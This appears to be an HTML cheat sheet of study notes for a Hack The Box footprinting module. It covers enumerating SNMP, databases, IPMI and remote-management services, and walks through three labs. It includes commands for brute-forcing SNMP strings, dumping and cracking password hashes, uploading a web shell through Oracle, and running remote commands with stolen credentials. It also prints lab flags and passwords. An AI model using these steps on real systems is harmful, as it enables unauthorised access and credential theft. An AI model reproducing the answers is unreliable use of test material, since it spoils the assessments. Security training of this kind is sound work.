+      <div class="card-title">Enumeration Toolkit</div>
+      <div class="code-block"><span class="comment"># Walk OID tree with known community string</span>
+<span class="prompt">$ </span>snmpwalk -v2c -c public 10.129.14.128
+
+<span class="comment"># Brute-force community string</span>
+<span class="prompt">$ </span>onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.14.128
+
+<span class="comment"># Fast bulk OID queries once string is known</span>
+<span class="prompt">$ </span>braa public@10.129.14.128:.1.3.6.*</div>
+    </div>
+
+    <div class="alert">
+      <div class="alert-title">💡 High-Value OIDs</div>
+      OID <code>.1.3.6.1.2.1.25.1.7</code> (running software/processes) frequently leaks credentials passed as command-line arguments. Walk the full tree carefully — don't stop at the first few results.
+    </div>
+  </div>
+
+  <!-- ════════════════════════════════════ -->
+  <!-- 11 · MySQL                          -->
+  <!-- ════════════════════════════════════ -->
+  <div class="section" id="mysql">
+    <div class="section-header">
+      <div class="section-num">11</div>
+      <div class="section-title">MySQL</div>
+      <div class="section-line"></div>
+    </div>
+    <p>Port <span class="tag tag-port">TCP 3306</span>. Default system databases: <code>information_schema</code>, <code>mysql</code>, <code>performance_schema</code>, <code>sys</code>. Any other database = created by the app → interesting data.</p>
+
+    <div class="card">
+      <div class="card-title">Connect + Core Commands</div>
+      <div class="code-block"><span class="prompt">$ </span>mysql -u robin -probin -h 10.129.99.102   <span class="comment"># no space after -p!</span>
+
+<span class="kw">show databases;</span>
+<span class="kw">use</span> customers;
+<span class="kw">show tables;</span>
+<span class="kw">describe</span> myTable;
+<span class="kw">SELECT</span> email <span class="kw">FROM</span> myTable <span class="kw">WHERE</span> name='Otto Lang';</div>
+    </div>
+
+    <div class="grid-2">
+      <div class="answer-box">
+        <div class="answer-icon">✓</div>
+        <div>
+          <div class="answer-q">MySQL version in use?</div>
+          <div class="answer-a">MySQL 8.0.27</div>
+        </div>
+      </div>
+      <div class="answer-box">
+        <div class="answer-icon">✓</div>
+        <div>
+          <div class="answer-q">Email of customer "Otto Lang" (robin:robin)?</div>
+          <div class="answer-a">ultrices@google.htb</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ════════════════════════════════════ -->
+  <!-- 12 · MSSQL                          -->
+  <!-- ════════════════════════════════════ -->
+  <div class="section" id="mssql">
+    <div class="section-header">
+      <div class="section-num">12</div>
+      <div class="section-title">MSSQL</div>
+      <div class="section-line"></div>
+    </div>
+    <p>Microsoft SQL Server — port <span class="tag tag-port">TCP 1433</span>. Common on .NET stacks. Windows Authentication validates via SAM/Active Directory. Default system DBs: <code>master</code>, <code>model</code>, <code>msdb</code>, <code>tempdb</code>, <code>resource</code>.</p>
+
+    <div class="card">
+      <div class="card-title">Footprinting</div>
+      <div class="code-block"><span class="prompt">$ </span>sudo nmap --script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password \
+    -sV -p1433 10.129.201.248
+
+<span class="comment"># Metasploit</span>
+msf6 > use auxiliary/scanner/mssql/mssql_ping</div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Connect with mssqlclient.py</div>
+      <div class="code-block"><span class="prompt">$ </span>impacket-mssqlclient backdoor:Password1@10.129.230.249 <span class="flag">-windows-auth</span>
+<span class="comment"># -windows-auth required for Windows accounts — without it: "Login failed"</span>
+
+SQL> select name from sys.databases</div>
+    </div>
+
+    <div class="alert">
+      <div class="alert-title">💡 -windows-auth Flag</div>
+      If the account is a Windows account (SAM/AD), you <strong>must</strong> add <code>-windows-auth</code>. Forgetting it = "Login failed" with no obvious reason.
+    </div>
+
+    <div class="grid-2">
+      <div class="answer-box">
+        <div class="answer-icon">✓</div>
+        <div>
+          <div class="answer-q">Hostname of MSSQL server?</div>
+          <div class="answer-a">ILF-SQL-01</div>
+        </div>
+      </div>
+      <div class="answer-box">
+        <div class="answer-icon">✓</div>
+        <div>
+          <div class="answer-q">Non-default database (backdoor:Password1)?</div>
+          <div class="answer-a">Employees</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ════════════════════════════════════ -->
+  <!-- 13 · ORACLE TNS                     -->
+  <!-- ════════════════════════════════════ -->
+  <div class="section" id="oracle">
+    <div class="section-header">
+      <div class="section-num">13</div>
+      <div class="section-title">Oracle TNS</div>
+      <div class="section-line"></div>
+    </div>
+    <p>Oracle Transparent Network Substrate — port <span class="tag tag-port">TCP 1521</span>. Config files in <code>$ORACLE_HOME/network/admin</code>: <code>tnsnames.ora</code> (client) + <code>listener.ora</code> (server). The SID is required to connect.</p>
+
+    <div class="card">
+      <div class="card-title">Enumeration Flow</div>
+      <div class="steps">
+        <div class="step">
+          <div class="step-num">1</div>
+          <div class="step-body">
+            <div class="step-title">Brute-force the SID</div>
+            <div class="code-block"><span class="prompt">$ </span>sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
+<span class="comment"># Common result: XE (Oracle Express Edition default SID)</span></div>
+          </div>
+        </div>
+        <div class="step">
+          <div class="step-num">2</div>
+          <div class="step-body">
+            <div class="step-title">Full enumeration with ODAT</div>
+            <div class="code-block"><span class="prompt">$ </span>./odat.py all -s 10.129.1.138
+<span class="comment"># Tries common Oracle creds — often finds: scott/tiger</span></div>
+          </div>
+        </div>
+        <div class="step">
+          <div class="step-num">3</div>
+          <div class="step-body">
+            <div class="step-title">Connect + dump hashes</div>
+            <div class="code-block"><span class="prompt">$ </span>sqlplus scott/tiger@10.129.1.138/XE as sysdba
+SQL> select name, password from sys.user$;</div>
+          </div>
+        </div>
+        <div class="step">
+          <div class="step-num">4</div>
+          <div class="step-body">
+            <div class="step-title">File upload (web shell)</div>
+            <div class="code-block"><span class="prompt">$ </span>./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba \
+    --putFile C:\\inetpub\\wwwroot shell.aspx ./shell.aspx</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="alert">
+      <div class="alert-title">⚠ PEP 668 on modern Parrot/Kali</div>
+      Add <code>--break-system-packages</code> to pip commands, or use a virtualenv. If ODAT fails with <code>No module named 'Crypto'</code>, reinstall <code>pycryptodome</code>. SyntaxWarnings from ODAT are harmless.
+    </div>
+
+    <div class="answer-box">
+      <div class="answer-icon">✓</div>
+      <div>
+        <div class="answer-q">Password hash of user DBSNMP?</div>
+        <div class="answer-a">E066D214D5421CCC</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ════════════════════════════════════ -->
+  <!-- 14 · IPMI                           -->
+  <!-- ════════════════════════════════════ -->
+  <div class="section" id="ipmi">
+    <div class="section-header">
+      <div class="section-num">14</div>
+      <div class="section-title">IPMI</div>
+      <div class="section-line"></div>
+    </div>
+    <p>Intelligent Platform Management Interface — <span class="tag tag-port">UDP 623</span>. Runs on a dedicated BMC microcontroller entirely separate from the OS. Gaining BMC access ≈ physical access.</p>
+
+    <div class="grid-2">
+      <div class="card">
+        <div class="card-title">Default Credentials</div>
+        <div class="tbl-wrap">
+          <table>
+            <thead><tr><th>Product</th><th>User</th><th>Pass</th></tr></thead>
+            <tbody>
+              <tr><td>Dell iDRAC</td><td><code>root</code></td><td><code>calvin</code></td></tr>
+              <tr><td>HP iLO</td><td><code>Administrator</code></td><td>random 8-char (A-Z 0-9)</td></tr>
+              <tr><td>Supermicro</td><td><code>ADMIN</code></td><td><code>ADMIN</code></td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-title">The RAKP Hash Disclosure <span class="tag tag-danger">CRITICAL</span></div>
+        <p style="font-size:13px;">IPMI 2.0 leaks a salted SHA1/MD5 hash for any valid user <strong>before authentication completes</strong>. No fix — it's in the spec.</p>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Attack Flow</div>
+      <div class="code-block"><span class="comment"># Dump hashes</span>
+msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
+msf6 > set rhosts 10.129.42.195 && run
+<span class="comment"># Save hash, crack with hashcat mode 7300</span>
+<span class="prompt">$ </span>hashcat -m 7300 hashed.txt rockyou.txt
+
+<span class="comment"># HP iLO mask attack (uppercase + digits, 8 chars)</span>
+<span class="prompt">$ </span>hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u</div>
+    </div>
+
+    <div class="grid-2">
+      <div class="answer-box">
+        <div class="answer-icon">✓</div>
+        <div>
+          <div class="answer-q">IPMI username?</div>
+          <div class="answer-a">admin</div>
+        </div>
+      </div>
+      <div class="answer-box">
+        <div class="answer-icon">✓</div>
+        <div>
+          <div class="answer-q">Cleartext password (RAKP crack)?</div>
+          <div class="answer-a">trinity</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ════════════════════════════════════ -->
+  <!-- 15 · METHODOLOGY                    -->
+  <!-- ════════════════════════════════════ -->
+  <div class="section" id="methodology">
+    <div class="section-header">
+      <div class="section-num">15</div>
+      <div class="section-title">Enumeration Methodology — 6 Layers</div>
+      <div class="section-line"></div>
+    </div>
+
+    <div class="tbl-wrap">
+      <table>
+        <thead><tr><th>Layer</th><th>Goal</th><th>Key Information</th></tr></thead>
+        <tbody>
+          <tr><td><strong>1 · Internet Presence</strong></td><td>Identify externally accessible infrastructure</td><td>Domains, subdomains, vHosts, ASN, IPs, cloud, security measures</td></tr>
+          <tr><td><strong>2 · Gateway</strong></td><td>Identify security measures protecting infrastructure</td><td>Firewalls, DMZ, IPS/IDS, EDR, proxies, VPN, Cloudflare</td></tr>
+          <tr><td><strong>3 · Accessible Services</strong></td><td>Understand each service's purpose and how to communicate with it</td><td>Service type, function, config, port, version, interface</td></tr>
+          <tr><td><strong>4 · Processes</strong></td><td>Understand data flows between services</td><td>PID, processed data, tasks, source, destination</td></tr>
+          <tr><td><strong>5 · Privileges</strong></td><td>Identify permissions for each service and user</td><td>Groups, users, permissions, restrictions, environment</td></tr>
+          <tr><td><strong>6 · OS Setup</strong></td><td>Understand internal components and system configuration</td><td>OS type, patch level, network config, config files, sensitive files</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="alert alert-blue">
+      <div class="alert-title">💡 How to Use This</div>
+      Treat layers as a checklist moving from outside-in. A credential found at Layer 3 (service) becomes useful at Layer 5 (privileges) and may reveal Layer 6 (sensitive files). Layers 1 and 2 don't fully apply to intranet/AD environments.
+    </div>
+  </div>
+
+  <!-- ════════════════════════════════════ -->
+  <!-- 16 · LINUX REMOTE MGMT             -->
+  <!-- ════════════════════════════════════ -->
+  <div class="section" id="linux-remote">
+    <div class="section-header">
+      <div class="section-num">16</div>
+      <div class="section-title">Linux Remote Management</div>
+      <div class="section-line"></div>
+    </div>
+
+    <div class="subsection-title">SSH <span class="tag tag-port">TCP 22</span></div>
+    <div class="card">
+      <div class="card-title">Dangerous Settings <span class="tag tag-danger">WATCH FOR</span></div>
+      <div class="tbl-wrap">
+        <table>
+          <thead><tr><th>Setting</th><th>Risk</th></tr></thead>
+          <tbody>
+            <tr><td><code>PasswordAuthentication yes</code></td><td>Brute-forceable</td></tr>
+            <tr><td><code>PermitEmptyPasswords yes</code></td><td>Empty passwords allowed</td></tr>
+            <tr><td><code>PermitRootLogin yes</code></td><td>Direct root login</td></tr>
+            <tr><td><code>Protocol 1</code></td><td>Outdated, insecure</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-title">Footprinting + Key Usage</div>
+      <div class="code-block"><span class="comment"># Enumerate algorithms + weaknesses</span>
+<span class="prompt">$ </span>./ssh-audit.py 10.129.14.132
+
+<span class="comment"># Force password auth to confirm it's allowed</span>
+<span class="prompt">$ </span>ssh -v user@target -o PreferredAuthentications=password
+
+<span class="comment"># Use a recovered private key</span>
+<span class="prompt">$ </span>chmod 600 id_rsa     <span class="comment"># SSH refuses keys readable by others</span>
+<span class="prompt">$ </span>ssh -i id_rsa user@target
+
+<span class="comment"># Crack passphrase-protected key</span>
+<span class="prompt">$ </span>ssh2john id_rsa > hash.txt && john --wordlist=rockyou.txt hash.txt</div>
+    </div>
+
+    <hr>
+
+    <div class="subsection-title">Rsync <span class="tag tag-port">TCP 873</span></div>
+    <div class="card">
+      <div class="card-title">Enumeration</div>
+      <div class="code-block"><span class="prompt">$ </span>sudo nmap -sV -p 873 127.0.0.1
+<span class="prompt">$ </span>nc -nv 127.0.0.1 873          <span class="comment"># list modules (enter "#list")</span>
+<span class="prompt">$ </span>rsync -av --list-only rsync://127.0.0.1/dev  <span class="comment"># list share contents</span>
+<span class="prompt">$ </span>rsync -av rsync://127.0.0.1/dev ./loot       <span class="comment"># download everything</span></div>
+    </div>
+
+    <hr>
+
+    <div class="subsection-title">R-Services <span class="tag tag-danger">LEGACY / DANGEROUS</span> — ports 512, 513, 514</div>
+    <div class="card">
+      <div class="card-title">R-Services Overview</div>
+      <p style="font-size:13px;margin-bottom:10px;">Authentication bypassed by <code>/etc/hosts.equiv</code> and <code>.rhosts</code> trust files. A host listed there can connect with <strong>no password</strong>.</p>
+      <div class="tbl-wrap">
+        <table>
+          <thead><tr><th>Command</th><th>Port</th><th>Description</th></tr></thead>
+          <tbody>
+            <tr><td><code>rcp</code></td><td>514/TCP</td><td>File copy — no overwrite warning</td></tr>
+            <tr><td><code>rsh</code></td><td>514/TCP</td><td>Remote shell — no login, trusts host files</td></tr>
+            <tr><td><code>rexec</code></td><td>512/TCP</td><td>Run commands — unencrypted, overridden by trust files</td></tr>
+            <tr><td><code>rlogin</code></td><td>513/TCP</td><td>Remote login — overridden by trust files</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+
+  <!-- ════════════════════════════════════ -->
+  <!-- 17 · WINDOWS REMOTE MGMT           -->
+  <!-- ════════════════════════════════════ -->
+  <div class="section" id="windows-remote">
+    <div class="section-header">
+      <div class="section-num">17</div>
+      <div class="section-title">Windows Remote Management</div>
+      <div class="section-line"></div>
+    </div>
+
+    <div class="subsection-title">WinRM <span class="tag tag-port">TCP 5985</span> (HTTP) / <span class="tag tag-port">5986</span> (HTTPS)</div>
+    <div class="card">
+      <div class="card-title">Footprint + Connect</div>
+      <div class="code-block"><span class="prompt">$ </span>nmap -sV -sC 10.129.201.248 -p5985,5986 --disable-arp-ping -n
+<span class="comment"># Look for: Microsoft HTTPAPI httpd 2.0 banner</span>
+
+<span class="prompt">$ </span>evil-winrm -i 10.129.201.248 -u Cry0l1t3 -p P455w0rD!</div>
+      <p style="font-size:12px;margin-top:8px;">Gives an interactive PowerShell session — fully scriptable, no GUI overhead.</p>
+    </div>
+
+    <hr>
+
+    <div class="subsection-title">WMI <span class="tag tag-port">TCP 135</span> (init) → random high port</div>
+    <div class="card">
+      <div class="card-title">Remote Command Execution</div>
+      <div class="code-block"><span class="prompt">$ </span>wmiexec.py Cry0l1t3:"P455w0rD!"@10.129.201.248 "hostname"
+[*] SMBv3.0 dialect used
+ILF-SQL-01</div>
+      <p style="font-size:12px;margin-top:8px;">If port 135 is open + you have credentials → immediate command execution option.</p>
+    </div>
+  </div>
+
+  <!-- ════════════════════════════════════ -->
+  <!-- 18 · LAB EASY                       -->
+  <!-- ════════════════════════════════════ -->
+  <div class="section" id="lab-easy">
+    <div class="section-header">
+      <div class="section-num">18</div>
+      <div class="section-title">Footprinting Lab — Easy</div>
+      <div class="section-line"></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Scenario</div>
+      <p style="font-size:13px;">Internal DNS server. Credentials supplied: <code>ceil:qwer1234</code>. Hint: employees discussing SSH keys on a forum. Target: <code>10.129.2.82</code></p>
+    </div>
+
+    <div class="chain" style="margin:16px 0;">
+      <div class="chain-node">FTP port 2121 ("Ceil's FTP")</div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-node">Login as ceil</div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-node">Grab .ssh/id_rsa</div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-node">SSH in</div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-node">Read /home/flag/flag.txt</div>
+    </div>
+
+    <div class="steps">
+      <div class="step">
+        <div class="step-num">1</div>
+        <div class="step-body">
+          <div class="step-title">Two FTP servers — port 2121 is "Ceil's FTP"</div>
+          <div class="code-block"><span class="prompt">$ </span>ftp 10.129.2.82 2121   <span class="comment"># non-standard port as 2nd argument</span>
+Name: ceil  Password: qwer1234</div>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num">2</div>
+        <div class="step-body">
+          <div class="step-title">Grab the private key from .ssh/</div>
+          <div class="code-block">ftp> cd .ssh && get id_rsa</div>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num">3</div>
+        <div class="step-body">
+          <div class="step-title">SSH in with the key</div>
+          <div class="code-block"><span class="prompt">$ </span>chmod 600 id_rsa
+<span class="prompt">$ </span>ssh -i id_rsa ceil@10.129.2.82</div>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num">4</div>
+        <div class="step-body">
+          <div class="step-title">Read the flag</div>
+          <div class="code-block">ceil@NIXEASY:~$ cat /home/flag/flag.txt</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="answer-box">
+      <div class="answer-icon">✓</div>
+      <div>
+        <div class="answer-q">flag.txt contents:</div>
+        <div class="answer-a">HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}</div>
+      </div>
+    </div>
+
+    <div class="alert" style="margin-top:12px;">
+      <div class="alert-title">💡 Takeaways</div>
+      A service on a non-standard port named after a user you have credentials for is a strong signal. Recovered private keys need <code>chmod 600</code> before SSH will accept them.
+    </div>
+  </div>
+
+  <!-- ════════════════════════════════════ -->
+  <!-- 19 · LAB MEDIUM                     -->
+  <!-- ════════════════════════════════════ -->
+  <div class="section" id="lab-medium">
+    <div class="section-header">
+      <div class="section-num">19</div>
+      <div class="section-title">Footprinting Lab — Medium</div>
+      <div class="section-line"></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Scenario</div>
+      <p style="font-size:13px;">Internal server accessible to everyone on the network. Windows host exposing SMB, RPC, RDP, and NFS. Find user <code>HTB</code>'s password. Target: <code>10.129.202.41</code></p>
+    </div>
+
+    <div class="chain" style="margin:16px 0;">
+      <div class="chain-node">NFS /TechSupport</div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-node">alex:lol123!mD (SMTP config in ticket)</div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-node">SMB devshare</div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-node">sa:87N1ns@slls83</div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-node">RDP + MSSQL</div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-node">HTB password</div>
+    </div>
+
+    <div class="steps">
+      <div class="step">
+        <div class="step-num">1</div>
+        <div class="step-body">
+          <div class="step-title">Mount NFS, find non-empty ticket</div>
+          <div class="code-block"><span class="prompt">$ </span>sudo mount -t nfs -o vers=3,tcp,nolock 10.129.202.41:/TechSupport ~/target-NFS
+<span class="comment"># Most files are 0 bytes — one ticket contains an SMTP config block</span>
+<span class="comment"># Found: alex:lol123!mD</span></div>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num">2</div>
+        <div class="step-body">
+          <div class="step-title">Reuse alex's creds on SMB → loot devshare</div>
+          <div class="code-block"><span class="prompt">$ </span>smbclient -U alex //10.129.202.41/devshare
+smb: \> get important.txt
+<span class="comment"># Contents: sa:87N1ns@slls83</span></div>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num">3</div>
+        <div class="step-body">
+          <div class="step-title">RDP in, query MSSQL as sa</div>
+          <div class="code-block"><span class="prompt">$ </span>xfreerdp3 /v:10.129.202.41 /u:alex /p:'lol123!mD' /cert:ignore
+<span class="comment"># In MSSQL as sa:</span>
+SQL> SELECT * FROM devsacc WHERE name='HTB';</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="answer-box">
+      <div class="answer-icon">✓</div>
+      <div>
+        <div class="answer-q">HTB user password:</div>
+        <div class="answer-a">lnch7ehrdn43i7AoqVPK4zWR</div>
+      </div>
+    </div>
+
+    <div class="alert" style="margin-top:12px;">
+      <div class="alert-title">💡 Takeaways</div>
+      When most files in a share look empty, check sizes individually. Always try recovered creds against every other service. Credential reuse across protocols (SMTP → SMB → MSSQL) is the central theme.
+    </div>
+  </div>
+
+  <!-- ════════════════════════════════════ -->
+  <!-- 20 · LAB HARD                       -->
+  <!-- ════════════════════════════════════ -->
+  <div class="section" id="lab-hard">
+    <div class="section-header">
+      <div class="section-num">20</div>
+      <div class="section-title">Footprinting Lab — Hard</div>
+      <div class="section-line"></div>
+    </div>
+
+    <div class="card">
+      <div class="card-title">Scenario</div>
+      <p style="font-size:13px;">MX and management server, also a backup server for internal domain accounts. Linux host (NIXHARD). Find user <code>HTB</code>'s password. Target: <code>10.129.3.149</code></p>
+    </div>
+
+    <div class="chain" style="margin:16px 0;">
+      <div class="chain-node">UDP scan → SNMP 161/udp</div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-node">Community: "backup"</div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-node">snmpwalk → tom:NMds732Js2761</div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-node">IMAP → SSH key in email</div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-node">SSH as tom</div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-node">MySQL users DB → HTB password</div>
+    </div>
+
+    <div class="steps">
+      <div class="step">
+        <div class="step-num">1</div>
+        <div class="step-body">
+          <div class="step-title">TCP yields only mail services — scan UDP</div>
+          <div class="code-block"><span class="prompt">$ </span>sudo nmap -sU -sV -F 10.129.3.149
+<span class="comment"># Found: 161/udp SNMP</span></div>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num">2</div>
+        <div class="step-body">
+          <div class="step-title">Brute-force SNMP community string</div>
+          <div class="code-block"><span class="prompt">$ </span>onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.129.3.149
+<span class="comment"># Found: [backup]</span></div>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num">3</div>
+        <div class="step-body">
+          <div class="step-title">Walk SNMP — process OIDs leak credentials</div>
+          <div class="code-block"><span class="prompt">$ </span>snmpwalk -c backup -v2c 10.129.3.149
+<span class="comment"># Process args OID: "tom NMds732Js2761"</span></div>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num">4</div>
+        <div class="step-body">
+          <div class="step-title">IMAP login → read email → SSH private key</div>
+          <div class="code-block"><span class="prompt">$ </span>openssl s_client 10.129.3.149:993
+1 LOGIN tom NMds732Js2761
+1 SELECT INBOX
+1 FETCH 1 BODY[]
+<span class="comment"># Email subject "KEY" contains full -----BEGIN OPENSSH PRIVATE KEY-----</span></div>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num">5</div>
+        <div class="step-body">
+          <div class="step-title">SSH in, query MySQL</div>
+          <div class="code-block"><span class="prompt">$ </span>chmod 600 tom_id_rsa && ssh -i tom_id_rsa tom@10.129.3.149
+
+tom@NIXHARD:~$ mysql -u tom -pNMds732Js2761
+mysql> use users;
+mysql> select username,password from users where username='HTB';</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="answer-box">
+      <div class="answer-icon">✓</div>
+      <div>
+        <div class="answer-q">HTB user password:</div>
+        <div class="answer-a">cr3n4o7rzse7rzhnckhssncif7ds</div>
+      </div>
+    </div>
+
+    <div class="alert" style="margin-top:12px;">
+      <div class="alert-title">💡 Takeaways</div>
+      When TCP yields nothing usable, <strong>always scan UDP</strong> — SNMP on 161/udp was the entire key to this box. SNMP process OIDs frequently leak credentials passed as command-line arguments. A private key can hide anywhere — even in an email body.
+    </div>
+  </div>
+
+</main>
+</div><!-- /page -->
+</body>
+</html>
